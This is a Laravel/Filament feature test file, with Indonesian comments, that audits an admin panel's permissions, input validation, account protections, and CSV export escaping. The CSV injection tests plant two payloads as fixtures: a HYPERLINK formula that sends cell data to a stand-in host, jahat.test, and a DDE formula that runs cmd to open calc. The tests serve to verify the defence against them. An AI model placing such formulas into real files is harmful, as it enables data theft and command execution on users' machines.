<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Enums\DikerjakanOleh;
use App\Enums\KategoriMitra;
use App\Filament\Resources\Mitras\MitraResource;
use App\Filament\Resources\MonitoringSpk\StatusSpkResource;
use App\Filament\Resources\Penggunas\PenggunaResource;
use App\Filament\Resources\Spks\Pages\CreateSpk;
use App\Filament\Resources\Spks\SpkResource;
use App\Filament\Resources\UangKeluars\Pages\CreateUangKeluar;
use App\Filament\Resources\UangKeluars\UangKeluarResource;
use App\Filament\Resources\UangMasuks\UangMasukResource;
use App\Models\Mitra;
use App\Models\Pengguna;
use App\Models\Spk;
use App\Models\UangKeluar;
use App\Models\UangMasuk;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * UJI KEAMANAN & CELAH (audit).
 *
 * Fokus:
 *   1. Direktur TIDAK bisa menembus lewat Livewire langsung (bypass UI).
 *   2. Tamu tidak bisa apa-apa.
 *   3. Validasi input (mass assignment, relasi palsu, nilai tak wajar).
 *   4. Proteksi akun (hapus diri sendiri, akun terakhir).
 */
class AuditKeamananTest extends TestCase
{
    use RefreshDatabase;

    private Pengguna $admin;

    private Pengguna $direktur;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = Pengguna::factory()->admin()->create(['email' => 'sec-admin@bks.test']);
        $this->direktur = Pengguna::factory()->direktur()->create(['email' => 'sec-dir@bks.test']);
    }

    // =========================================================
    // 1. DIREKTUR MENEMBUS LEWAT LIVEWIRE (bypass UI)
    // =========================================================

    public function test_direktur_tidak_bisa_buat_spk(): void
    {
        $this->actingAs($this->direktur);

        // Filament memblokir di level izin Resource (403 saat buka halaman).
        $this->assertFalse(SpkResource::canCreate());
        $this->get('/admin/spks/create')->assertForbidden();

        $this->assertSame(0, Spk::count());
    }

    public function test_direktur_tidak_bisa_ubah_spk(): void
    {
        $spk = Spk::factory()->pln()->create([
            'nomor_spk' => 'ASLI-1',
            'nilai_spk' => 100_000_000,
            'dibuat_oleh' => $this->admin->id,
        ]);

        $this->actingAs($this->direktur);

        $this->assertFalse(SpkResource::canEdit($spk));
        $this->get('/admin/spks/'.$spk->getRouteKey().'/edit')->assertForbidden();

        $this->assertSame(100_000_000.0, (float) $spk->fresh()->nilai_spk);
    }

    public function test_direktur_tidak_bisa_buat_uang_masuk(): void
    {
        $this->actingAs($this->direktur);

        $this->assertFalse(UangMasukResource::canCreate());
        $this->get('/admin/uang-masuks/create')->assertForbidden();

        $this->assertSame(0, UangMasuk::count());
    }

    public function test_direktur_tidak_bisa_buat_uang_keluar(): void
    {
        $this->actingAs($this->direktur);

        $this->assertFalse(UangKeluarResource::canCreate());
        $this->get('/admin/uang-keluars/create')->assertForbidden();

        $this->assertSame(0, UangKeluar::count());
    }

    public function test_direktur_tidak_bisa_buat_mitra(): void
    {
        $this->actingAs($this->direktur);

        $this->assertFalse(MitraResource::canCreate());
        $this->get('/admin/mitras/create')->assertForbidden();

        $this->assertSame(0, Mitra::count());
    }

    /**
     * ⚠️ REVISI USER: menu Pengguna sekarang HANYA untuk Direktur.
     * Jadi ADMIN yang tidak boleh, bukan Direktur.
     */
    public function test_admin_tidak_bisa_buat_pengguna(): void
    {
        $sebelum = Pengguna::count();

        $this->actingAs($this->admin);

        $this->assertFalse(PenggunaResource::canCreate());
        $this->get('/admin/penggunas/create')->assertForbidden();

        $this->assertSame($sebelum, Pengguna::count());
    }

    public function test_direktur_bisa_buat_pengguna(): void
    {
        $this->actingAs($this->direktur);

        $this->assertTrue(PenggunaResource::canCreate());
        $this->get('/admin/penggunas/create')->assertOk();
    }

    public function test_direktur_tidak_bisa_ubah_status_spk(): void
    {
        $spk = Spk::factory()->pln()->create([
            'nomor_spk' => 'STAT-1',
            'status_spk' => 'draft',
            'dibuat_oleh' => $this->admin->id,
        ]);

        $this->actingAs($this->direktur);

        // Kolom status di halaman monitoring bersifat read-only bagi Direktur.
        $this->assertFalse(
            StatusSpkResource::canEdit($spk),
            'CELAH: Direktur bisa mengubah status SPK'
        );
    }

    // =========================================================
    // 2. TAMU (belum login)
    // =========================================================

    public function test_tamu_tidak_bisa_buka_halaman_create(): void
    {
        $this->get('/admin/spks/create')->assertRedirect('/admin/login');

        $this->assertSame(0, Spk::count());
    }

    public function test_tamu_tidak_bisa_buka_halaman_admin(): void
    {
        foreach ([
            '/admin', '/admin/spks', '/admin/spks/create',
            '/admin/mitras', '/admin/uang-masuks', '/admin/uang-keluars',
            '/admin/penggunas', '/admin/laporan',
            '/admin/monitoring-spk/status-spks',
            '/admin/monitoring-spk/tagihan-spks',
            '/admin/monitoring-spk/tagihan-selesai-spks',
        ] as $url) {
            $this->get($url)->assertRedirect('/admin/login');
        }
    }

    public function test_tamu_tidak_bisa_ekspor_csv(): void
    {
        foreach (['spk', 'piutang', 'aging', 'tenggat', 'laba_rugi', 'cashflow', 'kategori'] as $jenis) {
            $this->get('/admin/laporan/ekspor/'.$jenis)->assertRedirect('/admin/login');
        }
    }

    // =========================================================
    // 3. VALIDASI INPUT
    // =========================================================

    public function test_tidak_bisa_menyisipkan_kolom_lewat_mass_assignment(): void
    {
        $this->actingAs($this->admin);

        // `dibuat_oleh` TIDAK boleh bisa ditentukan sembarang dari form
        Livewire::test(CreateSpk::class)
            ->fillForm([
                'nomor_spk' => 'MAS-1',
                'nama_pekerjaan' => 'Uji mass assignment',
                'nilai_spk' => 1_000_000,
                'dikerjakan_oleh' => DikerjakanOleh::Sendiri->value,
                // kolom sensitif di bawah — tidak boleh terisi dari form
                'id' => 99999,
            ])
            ->call('create')
            ->assertHasNoFormErrors();

        $spk = Spk::where('nomor_spk', 'MAS-1')->first();

        $this->assertNotNull($spk);
        $this->assertNotSame(99999, $spk->id, 'CELAH: id bisa ditentukan dari form');
    }

    public function test_spk_id_palsu_ditolak(): void
    {
        $this->actingAs($this->admin);

        Livewire::test(CreateUangKeluar::class)
            ->fillForm([
                'pengeluaran' => [
                    [
                        'tanggal' => '2026-09-01',
                        'jumlah' => 1_000_000,
                        'kategori' => 'material',
                        'spk_id' => 999999, // SPK tidak ada
                    ],
                ],
            ])
            ->call('create');

        $this->assertSame(0, UangKeluar::count(), 'CELAH: spk_id palsu diterima');
    }

    public function test_kategori_pengeluaran_palsu_ditolak(): void
    {
        $this->actingAs($this->admin);

        Livewire::test(CreateUangKeluar::class)
            ->fillForm([
                'pengeluaran' => [
                    ['tanggal' => '2026-09-01', 'jumlah' => 1_000_000, 'kategori' => 'KATEGORI NGAWUR'],
                ],
            ])
            ->call('create');

        $this->assertSame(0, UangKeluar::count(), 'CELAH: kategori palsu diterima');
    }

    public function test_status_spk_diisi_otomatis_saat_dibuat(): void
    {
        // ⚠️ REVISI USER: status tidak lagi dipilih di form Tambah.
        // SPK baru otomatis Draft + Belum Ditagihkan.
        $this->actingAs($this->admin);

        Livewire::test(CreateSpk::class)
            ->fillForm([
                'nomor_spk' => 'OTOMATIS-1',
                'nama_pekerjaan' => 'Uji status otomatis',
                'nilai_spk' => 1_000_000,
                'dikerjakan_oleh' => DikerjakanOleh::Sendiri->value,
            ])
            ->call('create')
            ->assertHasNoFormErrors();

        $spk = Spk::where('nomor_spk', 'OTOMATIS-1')->first();

        $this->assertNotNull($spk, 'SPK baru harus tersimpan');
        $this->assertSame('draft', $spk->status_spk->value);
        $this->assertSame('belum_ditagihkan', $spk->status_tagihan->value);
    }

    public function test_nilai_negatif_ditolak(): void
    {
        $this->actingAs($this->admin);

        Livewire::test(CreateUangKeluar::class)
            ->fillForm([
                'pengeluaran' => [
                    ['tanggal' => '2026-09-01', 'jumlah' => -5_000_000, 'kategori' => 'material'],
                ],
            ])
            ->call('create');

        $this->assertSame(0, UangKeluar::count(), 'CELAH: nilai negatif diterima');
    }

    // =========================================================
    // 4. PROTEKSI AKUN
    // =========================================================

    public function test_admin_tidak_bisa_hapus_akun_sendiri(): void
    {
        $this->actingAs($this->admin);

        // Menghapus akun sendiri = sistem terkunci
        $this->assertFalse(
            PenggunaResource::canDelete($this->admin),
            'CELAH: Admin bisa menghapus akunnya sendiri (sistem bisa terkunci)'
        );
    }

    public function test_direktur_tidak_bisa_nonaktifkan_akun_sendiri(): void
    {
        $this->actingAs($this->direktur);

        // Perlindungan lapis 1: halaman edit diri sendiri DIBLOKIR.
        $this->assertFalse(
            PenggunaResource::canEdit($this->direktur),
            'CELAH: Direktur bisa membuka halaman edit dirinya sendiri'
        );

        $this->get('/admin/penggunas/'.$this->direktur->getRouteKey().'/edit')
            ->assertForbidden();

        // Perlindungan lapis 2: akun tetap aktif.
        $this->assertTrue($this->direktur->fresh()->is_aktif);
    }

    public function test_direktur_masih_bisa_edit_pengguna_lain(): void
    {
        $this->actingAs($this->direktur);

        $this->assertTrue(
            PenggunaResource::canEdit($this->admin),
            'Direktur harus tetap bisa mengubah pengguna LAIN'
        );

        $this->get('/admin/penggunas/'.$this->admin->getRouteKey().'/edit')->assertOk();
    }

    public function test_admin_tidak_bisa_lihat_menu_pengguna(): void
    {
        $this->actingAs($this->admin);

        $this->assertFalse(PenggunaResource::canViewAny());
        $this->assertFalse(PenggunaResource::shouldRegisterNavigation());
        $this->get('/admin/penggunas')->assertForbidden();
    }

    public function test_pengguna_nonaktif_tidak_bisa_login(): void
    {
        $nonaktif = Pengguna::factory()->admin()->create([
            'email' => 'nonaktif@bks.test',
            'is_aktif' => false,
            'password' => bcrypt('password123'),
        ]);

        $this->assertFalse($nonaktif->canAccessPanel(filament()->getPanel('admin')));
    }

    // =========================================================
    // 5. CSV INJECTION
    // =========================================================

    /**
     * Nilai dari database yang diawali =, +, -, @ harus dinetralkan
     * supaya Excel tidak menjalankannya sebagai RUMUS.
     */
    public function test_ekspor_csv_menetralkan_rumus_excel(): void
    {
        // Nama pekerjaan yang berbahaya kalau dibuka di Excel
        Spk::factory()->pln()->create([
            'nomor_spk' => 'INJ-1',
            'nama_pekerjaan' => '=HYPERLINK("http://jahat.test/?x="&A1,"klik")',
            'nilai_spk' => 1_000_000,
            'dibuat_oleh' => $this->admin->id,
        ]);

        $this->actingAs($this->admin);

        $respons = $this->get('/admin/laporan/ekspor/spk')->assertOk();
        $isi = $respons->streamedContent();

        // Rumus TIDAK boleh muncul dalam bentuk yang bisa dieksekusi.
        $this->assertStringNotContainsString(
            ';=HYPERLINK',
            $isi,
            'CELAH: nilai berbahaya ditulis mentah ke CSV (CSV injection)'
        );

        // Harus dinetralkan dengan apostrof.
        $this->assertStringContainsString("'=HYPERLINK", $isi);
    }

    public function test_ekspor_csv_menetralkan_kurang_dan_at(): void
    {
        $mitra = Mitra::factory()->create([
            'nama' => "@SUM(1+1)*cmd|' /C calc'!A0",
            'kategori' => KategoriMitra::Mitra,
        ]);

        // Mitra harus terhubung ke SPK agar muncul di ekspor.
        Spk::factory()->pln()->create([
            'nomor_spk' => 'AT-1',
            'nama_pekerjaan' => 'Pekerjaan biasa',
            'mitra_id' => $mitra->id,
            'nilai_spk' => 1_000_000,
            'dibuat_oleh' => $this->admin->id,
        ]);

        $this->actingAs($this->admin);

        $isi = $this->get('/admin/laporan/ekspor/spk')->assertOk()->streamedContent();

        $this->assertStringNotContainsString(';@SUM', $isi, 'CELAH: nilai berawalan @ tidak dinetralkan');
        $this->assertStringContainsString("'@SUM", $isi);
    }

    public function test_ekspor_csv_tetap_menyimpan_angka_sebagai_angka(): void
    {
        Spk::factory()->pln()->create([
            'nomor_spk' => 'ANGKA-1',
            'nama_pekerjaan' => 'Pekerjaan normal',
            'nilai_spk' => 123_456_789,
            'dibuat_oleh' => $this->admin->id,
        ]);

        $this->actingAs($this->admin);

        $isi = $this->get('/admin/laporan/ekspor/spk')->assertOk()->streamedContent();

        // Angka TIDAK boleh diberi apostrof — supaya masih bisa dijumlahkan.
        $this->assertStringContainsString('123456789', $isi);
        $this->assertStringNotContainsString("'123456789", $isi);
    }
}
